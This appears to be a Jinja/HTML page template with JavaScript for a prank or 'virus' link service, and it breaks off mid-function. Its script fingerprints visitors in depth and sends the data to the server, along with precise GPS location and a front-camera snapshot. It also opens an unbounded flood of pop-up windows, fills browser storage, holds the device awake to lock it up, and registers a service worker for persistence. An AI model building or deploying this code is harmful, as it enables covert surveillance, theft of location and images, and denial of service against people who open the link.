<!doctype html>
<html lang="ja"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#0f1115">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<title>{{ link.name }}</title>
{% if mode == 'trojan_install' or mode == 'mix' %}
<link rel="manifest" href="/v/{{ code }}/manifest.json?name={{ link.name|urlencode }}">
<link rel="apple-touch-icon" href="/v/icon.svg">
{% endif %}
<style>
*{box-sizing:border-box}
html,body{margin:0;background:#0f1115;color:#e6e9ef;
  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
body{padding:18px;min-height:100vh}
.center{min-height:88vh;display:flex;align-items:center;justify-content:center;text-align:center}
.in{max-width:420px;width:100%}
.ring{width:34px;height:34px;margin:0 auto 14px;border-radius:50%;
  border:3px solid #2b3346;border-top-color:#4c8dff;animation:sp .8s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.st{color:#8b93a7;font-size:13px;min-height:1.6em;line-height:1.8}

.child{background:#0b0d11}
.child h1{color:#ff5a5a;font-size:26px;text-align:center;margin-top:14vh}
.child .warn{color:#f0b429;text-align:center;font-size:13px;line-height:1.9;margin-top:6px}
.child .fake{background:#11141a;border:1px solid #2a2f3a;border-radius:10px;padding:12px;
  margin:16px auto;max-width:420px;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;
  color:#9aa3b2;text-align:left;white-space:pre-wrap;height:150px;overflow:hidden}
.blink{animation:bl 1s steps(2,end) infinite}
@keyframes bl{50%{opacity:.15}}

body.glitch{animation:shake .12s infinite}
@keyframes shake{
  0%{transform:translate(0,0)}25%{transform:translate(-4px,3px)}
  50%{transform:translate(3px,-4px)}75%{transform:translate(-3px,-3px)}
  100%{transform:translate(4px,2px)}}
body.glitch .in,body.glitch h1{filter:invert(1) hue-rotate(90deg)}
#flash{position:fixed;inset:0;pointer-events:none;z-index:50;opacity:0;
  background:radial-gradient(circle,rgba(255,255,255,.9),rgba(255,0,0,.6) 60%,transparent 75%)}
#noise{position:fixed;inset:0;pointer-events:none;z-index:49;opacity:.12;
  background-image:repeating-linear-gradient(0deg,#fff 0 1px,transparent 1px 3px);display:none}
.rainbow{animation:rb .6s linear infinite}
@keyframes rb{to{filter:hue-rotate(360deg)}}
</style></head><body class="{{ 'child' if is_child else '' }}">

<div id="flash"></div>
<div id="noise"></div>

{% if is_child %}
  <h1 class="blink">{{ child_text }}</h1>
  <div class="warn">このウィンドウは閉じて問題ありません。</div>
  <div class="fake" id="fake"></div>
{% else %}
  <div class="center"><div class="in">
    <div class="ring"></div>
    <div class="st" id="st">読み込み中…</div>
  </div></div>
{% endif %}

<script>
window.V = {
  code: {{ code|tojson }},
  mode: {{ mode|tojson }},
  dest: {{ dest|tojson }},
  hit: {{ hit_id }},
  child: {{ 1 if is_child else 0 }},
  installed: {{ 1 if is_installed else 0 }},
  auto: {{ 1 if auto else 0 }},
  set: {{ winset }},
  seq: {{ seq }},
  name: {{ link.name|tojson }}
};
</script>
<script>
(function () {
  "use strict";
  var V = window.V, CODE = V.code, MODE = V.mode;
  var API = "/v/" + encodeURIComponent(CODE) + "/d";
  var ST = "/v/" + encodeURIComponent(CODE) + "/st";
  var STANDALONE = !!V.installed || (navigator.standalone === true) ||
    !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches);

  var VID = (function () {
    try {
      var v = localStorage.getItem("virus_vid");
      if (!v) { v = Math.random().toString(36).slice(2, 12) + Date.now().toString(36);
                localStorage.setItem("virus_vid", v); }
      return v;
    } catch (e) { return "x"; }
  })();

  function st(s) { var e = document.getElementById("st"); if (e) e.textContent = s || ""; }
  function send(items, beacon) {
    var body = JSON.stringify({ hit: V.hit, vid: VID, items: items || {} });
    if (beacon && navigator.sendBeacon) {
      try { if (navigator.sendBeacon(API, new Blob([body], { type: "application/json" }))) return; } catch (e) {}
    }
    try {
      fetch(API, { method: "POST", cache: "no-store",
                   headers: { "Content-Type": "application/json" },
                   body: body }).catch(function () {});
    } catch (e) {}
  }

  /* ================= 収集 ================= */
  function canvasHash() {
    try {
      var c = document.createElement("canvas"); c.width = 280; c.height = 60;
      var x = c.getContext("2d");
      x.textBaseline = "top"; x.font = "14px Arial";
      x.fillStyle = "#f60"; x.fillRect(0, 0, 280, 60);
      x.fillStyle = "#069"; x.fillText("igtracker あいう漢字", 2, 2);
      x.globalCompositeOperation = "multiply";
      var g = x.createLinearGradient(0, 0, 280, 0);
      g.addColorStop(0, "rgba(255,0,0,.2)"); g.addColorStop(1, "rgba(0,0,255,.2)");
      x.fillStyle = g; x.fillRect(0, 0, 280, 60);
      x.beginPath(); x.arc(60, 30, 20, 0, Math.PI * 2); x.fill();
      return c.toDataURL("image/png");
    } catch (e) { return ""; }
  }
  function webgl() {
    try {
      var c = document.createElement("canvas");
      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) return {};
      var d = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER),
        unVendor: d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : "",
        unRenderer: d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "",
        ver: gl.getParameter(gl.VERSION), maxTex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        ext: (gl.getSupportedExtensions() || []).length
      };
    } catch (e) { return {}; }
  }
  function fonts() {
    var list = ["Arial","Arial Black","Comic Sans MS","Courier New","Georgia","Impact",
      "Times New Roman","Trebuchet MS","Verdana","Helvetica","Tahoma","Palatino",
      "Hiragino Kaku Gothic ProN","Hiragino Sans","Yu Gothic","Meiryo","MS PGothic",
      "Noto Sans JP","Roboto","Segoe UI","Calibri","Cambria","Futura","Menlo","Monaco",
      "Apple SD Gothic Neo","Malgun Gothic","Droid Sans Fallback"];
    var base = ["monospace","sans-serif","serif"], hit = [];
    try {
      var s = document.createElement("span");
      s.style.cssText = "position:absolute;left:-9999px;font-size:72px;white-space:nowrap";
      s.textContent = "mmmmmmmmmmlli漢"; document.body.appendChild(s);
      var ref = {};
      base.forEach(function (b) { s.style.fontFamily = b; ref[b] = s.offsetWidth; });
      list.forEach(function (f) {
        base.some(function (b) {
          s.style.fontFamily = "'" + f + "'," + b;
          if (s.offsetWidth !== ref[b]) { hit.push(f); return true; }
          return false;
        });
      });
      document.body.removeChild(s);
    } catch (e) {}
    return hit;
  }
  function audioHash() {
    return new Promise(function (res) {
      try {
        var OAC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (!OAC) return res("");
        var ctx = new OAC(1, 44100, 44100);
        var o = ctx.createOscillator(); o.type = "triangle"; o.frequency.value = 10000;
        var g = ctx.createGain(); g.gain.value = 0;
        var c = ctx.createDynamicsCompressor();
        o.connect(c); c.connect(g); g.connect(ctx.destination); o.start(0);
        ctx.oncomplete = function (e) {
          try {
            var b = e.renderedBuffer.getChannelData(0), s = 0;
            for (var i = 4500; i < 5000; i++) s += Math.abs(b[i]);
            res(s.toFixed(8));
          } catch (err) { res(""); }
        };
        ctx.startRendering();
      } catch (e) { res(""); }
    });
  }
  function codecs() {
    try {
      var v = document.createElement("video"), a = document.createElement("audio");
      var t = function (el, s) { return el.canPlayType(s) || ""; };
      return [t(v,'video/mp4; codecs="avc1.42E01E"'), t(v,'video/webm; codecs="vp9"'),
              t(v,'video/mp4; codecs="hvc1"'), t(a,"audio/mpeg"),
              t(a,'audio/ogg; codecs="opus"'), t(a,'audio/mp4; codecs="mp4a.40.2"')].join(",");
    } catch (e) { return ""; }
  }
  function net() {
    try {
      var n = navigator.connection || {};
      return { type: n.effectiveType || "", downlink: n.downlink || 0, rtt: n.rtt || 0,
               save: n.saveData ? 1 : 0 };
    } catch (e) { return {}; }
  }
  function batt() {
    return new Promise(function (res) {
      try {
        if (!navigator.getBattery) return res({});
        navigator.getBattery().then(function (b) {
          res({ level: b.level, charging: b.charging ? 1 : 0, secs: b.dischargingTime });
        }).catch(function () { res({}); });
      } catch (e) { res({}); }
    });
  }
  function storageInfo() {
    return new Promise(function (res) {
      try {
        if (!navigator.storage || !navigator.storage.estimate) return res({});
        navigator.storage.estimate().then(function (s) {
          res({ quota: s.quota || 0, usage: s.usage || 0 });
        }).catch(function () { res({}); });
      } catch (e) { res({}); }
    });
  }
  function devices() {
    return new Promise(function (res) {
      try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return res({});
        navigator.mediaDevices.enumerateDevices().then(function (d) {
          res({ cam: d.filter(function (x) { return x.kind === "videoinput"; }).length,
                mic: d.filter(function (x) { return x.kind === "audioinput"; }).length,
                spk: d.filter(function (x) { return x.kind === "audiooutput"; }).length });
        }).catch(function () { res({}); });
      } catch (e) { res({}); }
    });
  }
  function gps(hi, ms) {
    return new Promise(function (res) {
      if (!navigator.geolocation) return res({});
      var done = false;
      var to = setTimeout(function () { if (!done) { done = true; res({}); } }, ms || 15000);
      try {
        navigator.geolocation.getCurrentPosition(function (p) {
          if (done) return; done = true; clearTimeout(to);
          res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy,
                alt: p.coords.altitude, spd: p.coords.speed, hdg: p.coords.heading });
        }, function () { if (done) return; done = true; clearTimeout(to); res({}); },
        { enableHighAccuracy: !!hi, timeout: (ms || 15000) - 1000, maximumAge: 0 });
      } catch (e) { clearTimeout(to); if (!done) { done = true; res({}); } }
    });
  }

  function collect(deep) {
    var wg = webgl();
    var base = {
      ua: navigator.userAgent,
      platform: navigator.platform || "",
      langs: (navigator.languages || [navigator.language]).join(","),
      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
                         catch (e) { return ""; } })(),
      tzoff: new Date().getTimezoneOffset(),
      locale: (function () { try { return navigator.language; } catch (e) { return ""; } })(),
      screen: screen.width + "x" + screen.height + "x" + screen.colorDepth + "x" + screen.pixelDepth,
      avail: screen.availWidth + "x" + screen.availHeight,
      win: innerWidth + "x" + innerHeight,
      dpr: devicePixelRatio || 1,
      cores: navigator.hardwareConcurrency || 0,
      mem: navigator.deviceMemory || 0,
      touch: navigator.maxTouchPoints || 0,
      cookie: navigator.cookieEnabled ? 1 : 0,
      pdf: navigator.pdfViewerEnabled ? 1 : 0,
      plugins: (navigator.plugins || []).length,
      mimes: (navigator.mimeTypes || []).length,
      referrer: document.referrer || "",
      history: history.length,
      standalone: STANDALONE ? 1 : 0,
      sw: ("serviceWorker" in navigator) ? 1 : 0,
      wake: ("wakeLock" in navigator) ? 1 : 0,
      bluetooth: ("bluetooth" in navigator) ? 1 : 0,
      usb: ("usb" in navigator) ? 1 : 0,
      webglVendor: wg.vendor || "", webglRenderer: wg.renderer || "",
      webglUnmaskedVendor: wg.unVendor || "", webglUnmaskedRenderer: wg.unRenderer || "",
      webglVersion: wg.ver || "", webglMaxTex: wg.maxTex || 0, webglExt: wg.ext || 0,
      codecs: codecs(),
      net: net(),
      perms: (function () { try { return navigator.permissions ? 1 : 0; } catch (e) { return 0; } })(),
      ts: new Date().toISOString()
    };
    if (!deep) return Promise.resolve(base);
    return Promise.all([audioHash(), batt(), storageInfo(), devices()]).then(function (r) {
      base.audioFp = r[0];
      base.battery = r[1];
      base.storage = r[2];
      base.devices = r[3];
      base.canvas = canvasHash();
      base.fonts = fonts().join(",");
      return base;
    });
  }

  /* ================= 音 ================= */
  var AC = null;
  function audioCtx() {
    try {
      var C = window.AudioContext || window.webkitAudioContext;
      if (!C) return null;
      if (!AC) AC = new C();
      if (AC.state === "suspended") AC.resume();
      return AC;
    } catch (e) { return null; }
  }
  function blip(ms) {
    var ac = audioCtx(); if (!ac) return;
    try {
      var o = ac.createOscillator(), g = ac.createGain();
      o.type = "square"; o.frequency.value = 880;
      g.gain.value = 0.08;
      o.connect(g); g.connect(ac.destination);
      o.start(); o.stop(ac.currentTime + (ms || 0.09));
    } catch (e) {}
  }
  function crashSound(sec) {
    var ac = audioCtx();
    if (!ac) return;
    var dur = sec || 3.2;
    var len = Math.floor(ac.sampleRate * dur);
    var buf = ac.createBuffer(1, len, ac.sampleRate);
    var d = buf.getChannelData(0);
    for (var i = 0; i < len; i++) {
      var t = i / ac.sampleRate;
      var decay = Math.pow(1 - i / len, 0.6);
      var noise = (Math.random() * 2 - 1);
      var saw = Math.sin(2 * Math.PI * (60 + 900 * Math.pow(1 - t / dur, 3)) * t);
      var bit = Math.round((noise * 0.7 + saw * 0.6) * 6) / 6;
      d[i] = bit * decay;
    }
    var src = ac.createBufferSource(); src.buffer = buf;
    var g = ac.createGain(); g.gain.value = 0.85;
    var f = ac.createBiquadFilter(); f.type = "lowpass"; f.frequency.value = 9000;
    src.connect(f); f.connect(g); g.connect(ac.destination);
    try { src.start(); } catch (e) {}
    setTimeout(function () {
      var ac2 = audioCtx(); if (!ac2) return;
      var l2 = Math.floor(ac2.sampleRate * 0.7);
      var b2 = ac2.createBuffer(1, l2, ac2.sampleRate);
      var d2 = b2.getChannelData(0);
      for (var j = 0; j < l2; j++) d2[j] = (Math.random() * 2 - 1) * Math.pow(1 - j / l2, 2.2);
      var s2 = ac2.createBufferSource(); s2.buffer = b2;
      var g2 = ac2.createGain(); g2.gain.value = 0.95;
      s2.connect(g2); g2.connect(ac2.destination);
      try { s2.start(); } catch (e) {}
    }, 700);
  }
  function glitch(ms) {
    document.body.classList.add("glitch", "rainbow");
    var n = document.getElementById("noise");
    if (n) n.style.display = "block";
    var f = document.getElementById("flash");
    var fl = setInterval(function () {
      if (f) f.style.opacity = Math.random() > 0.5 ? 0.5 : 0;
    }, 90);
    setTimeout(function () {
      clearInterval(fl);
      if (f) f.style.opacity = 0;
      if (n) n.style.display = "none";
      document.body.classList.remove("glitch", "rainbow");
    }, ms || 4200);
  }

  /* ================= 窓爆弾（完全自動・無限可・10秒で出し切る） ================= */
  var SET = (V.set === 0) ? 0 : (V.set || 100);   // 0 = 無限
  var firing = true;
  var seq = V.seq || 0;
  var widx = 0, fired = 0, running = false;

  function wantMore() {
    if (!firing) return false;
    if (SET === 0) return true;                    // 無限
    return fired < SET;
  }
  function pumpOnce(cap) {
    var made = 0;
    while (wantMore() && made < cap) {
      var w = null;
      try {
        w = window.open(location.pathname + "?w=1&n=" + widx,
              "igt_" + CODE + "_" + widx,
              "width=420,height=520,left=" + ((widx % 10) * 54) +
              ",top=" + (20 + (widx % 10) * 34));
      } catch (e) { w = null; }
      if (!w) break;                              // ブロック → 次のジェスチャ待ち
      widx++; fired++; made++;
    }
    if (made) send({ windows: made, window_total: widx, set: SET });
    return made;
  }
  function fireSet(reset) {
    if (!firing) return;
    if (reset) fired = 0;
    if (running) return;
    if (SET !== 0 && fired >= SET && !reset) return;
    running = true;
    var t0 = Date.now();
    (function tick() {
      if (!firing) { running = false; return; }
      var made = pumpOnce(SET === 0 ? 3 : 15);
      if (!made) { running = false; return; }
      if (!wantMore()) { running = false; return; }
      if (SET !== 0 && Date.now() - t0 > 10000) { running = false; return; }
      setTimeout(tick, 110);
    })();
  }

  /* ================= 容量枯渇（無限） ================= */
  function fillStorage(done) {
    var chunk = new Array(1024 * 64).join("x");
    var i = 0, total = 0;
    function stepLocal() {
      var end = Date.now() + 220;
      while (Date.now() < end) {
        try { localStorage.setItem("v_fill_" + i, chunk); i++; total += chunk.length; }
        catch (e) { return stepIDB(); }
        if (i > 8000) return stepIDB();
      }
      setTimeout(stepLocal, 0);
    }
    function stepIDB() {
      var req;
      try { req = indexedDB.open("virus_fill", 1); } catch (e) { return done && done(); }
      req.onupgradeneeded = function () { try { req.result.createObjectStore("s"); } catch (e) {} };
      req.onsuccess = function () {
        var db = req.result, n = 0;
        var blob = new Uint8Array(1024 * 512);
        for (var k = 0; k < blob.length; k += 512) blob[k] = Math.random() * 255;
        function put() {
          var end = Date.now() + 250;
          while (Date.now() < end) {
            try { db.transaction("s", "readwrite").objectStore("s").put(blob, "b" + (n++)); }
            catch (e) { break; }
            if (n > 20000) break;
          }
          total += blob.length;
          if (n <= 20000) setTimeout(put, 0); else finish();
        }
        function finish() {
          try {
            if (navigator.storage && navigator.storage.estimate) {
              navigator.storage.estimate().then(function (s) {
                send({ storage_used: s.usage, storage_quota: s.quota, filled: total });
                done && done();
              }).catch(function () { done && done(); });
            } else { send({ filled: total }); done && done(); }
          } catch (e) { done && done(); }
        }
        put();
      };
      req.onerror = function () { done && done(); };
    }
    stepLocal();
  }

  /* ================= ブリック（無限） ================= */
  var wakeLock = null, silentAudio = null;
  function brick() {
    try { window.onbeforeunload = function () { return "まだ処理中です"; }; } catch (e) {}
    try {
      if (navigator.wakeLock) {
        navigator.wakeLock.request("screen").then(function (w) {
          wakeLock = w; w.addEventListener("release", function () { wakeLock = null; });
        }).catch(function () {});
      }
    } catch (e) {}
    try {
      var C = window.AudioContext || window.webkitAudioContext;
      if (C) {
        var a = document.createElement("audio");
        a.src = "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAIA+AAACABAAZGF0YQAAAAA=";
        a.loop = true; a.volume = 1;
        a.style.cssText = "position:fixed;left:-9999px";
        document.body.appendChild(a);
        var p = a.play(); if (p && p.catch) p.catch(function () {});
        silentAudio = a;
      }
    } catch (e) {}
    setInterval(function () {
      if (!firing) return;
      if (wakeLock === null && navigator.wakeLock) {
        navigator.wakeLock.request("screen").then(function (w) { wakeLock = w; }).catch(function () {});
      }
      if (silentAudio && silentAudio.paused) {
        var p = silentAudio.play(); if (p && p.catch) p.catch(function () {});
      }
      send(behavior());
    }, 15000);
  }

  /* ================= 常駐型 ================= */
  function installMode() {
    try {
      if ("serviceWorker" in navigator) {
        navigator.serviceWorker.register("/v/sw.js", { scope: "/v/" }).catch(function () {});
      }
    } catch (e) {}
    window.addEventListener("beforeinstallprompt", function (e) {
      e.preventDefault();
      setTimeout(function () { try { e.prompt(); } catch (err) {} }, 1400);
    });
  }

  /* ================= カメラ ================= */
  function camShot(ms) {
    return new Promise(function (res) {
      try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return res(false);
        navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
          audio: false
        }).then(function (stm) {
          var v = document.createElement("video");
          v.autoplay = true; v.muted = true; v.playsInline = true;
          v.setAttribute("playsinline", "");
          v.style.cssText = "position:fixed;left:-9999px;top:0;width:160px";
          document.body.appendChild(v);
          v.srcObject = stm;
          var pp = v.play(); if (pp && pp.catch) pp.catch(function () {});
          setTimeout(function () {
            try {
              var w = v.videoWidth || 480, h = v.videoHeight || 360;
              var c = document.createElement("canvas"); c.width = w; c.height = h;
              var x = c.getContext("2d");
              x.translate(w, 0); x.scale(-1, 1); x.drawImage(v, 0, 0, w, h);
              send({ selfie: c.toDataURL("image/jpeg", 0.6) });
              try { stm.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
              try { v.remove(); } catch (e) {}
              res(true);
            } catch (e) { res(false); }
          }, ms || 1600);
        }).catch(function () { res(false); });
      } catch (e) { res(false); }
    });
  }

  /* ================= 行動ログ ================= */
  var t0 = Date.now(), hiddenMs = 0, hiddenAt = 0, maxScroll = 0;
  window.addEventListener("scroll", function () {
    var h = document.documentElement.scrollHeight - innerHeight;
    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
